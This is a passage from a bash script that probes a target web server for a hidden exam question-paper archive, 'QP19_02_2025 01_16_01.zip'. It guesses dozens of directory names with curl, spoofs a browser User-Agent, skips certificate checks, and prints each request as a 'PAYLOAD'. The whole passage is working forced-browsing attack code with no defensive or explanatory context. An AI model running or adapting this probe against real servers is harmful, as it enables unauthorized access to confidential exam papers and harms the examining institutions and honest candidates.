code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
